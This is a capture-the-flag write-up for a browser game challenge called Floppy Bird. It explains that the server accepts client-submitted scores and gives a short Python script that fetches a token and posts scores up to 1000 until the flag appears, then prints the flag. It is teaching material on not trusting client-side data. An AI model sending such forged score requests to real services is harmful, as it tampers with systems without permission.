# Floppy Bird – Writeup

## Challenge Description
```
I have recreated one of the most classic games in the browser, can you score 1000 points and get the flag?

Website: http://floppybird.challs.olicyber.it
```
In this challenge, the flag is awarded after reaching a certain score in the game. Instead of playing manually, we can exploit the server’s API to submit arbitrary scores until the flag is revealed.

## Challenge Analysis

1. **Token Retrieval**

   * A unique token is obtained from `/get-token`.
   * This token is required for all score submissions.

2. **Score Submission**

   * Each score is submitted via POST to `/update-score` with:

     ```json
     {
       "token": "<your_token>",
       "score": <i>
     }
     ```

3. **Obtaining the flag**

   * When we reach 1000 points we win so on the 1000th request the server sends the flag.

## Exploit
```python
import requests, json

site = "http://floppybird.challs.olicyber.it/"
token = json.loads(requests.get(site + "get-token").text)["token"]
r = ""

for i in range(1001):
    r = requests.post(site + "update-score", json={"token": token, "score": i}).json()
    if "flag" in r:
        print(r["flag"])
        break
````

## Flag

Running the exploit successfully retrieves the flag from the server’s response:

```
ptm{n3v3r_7rus7_cl13n7_s1d3_d4ta}
```
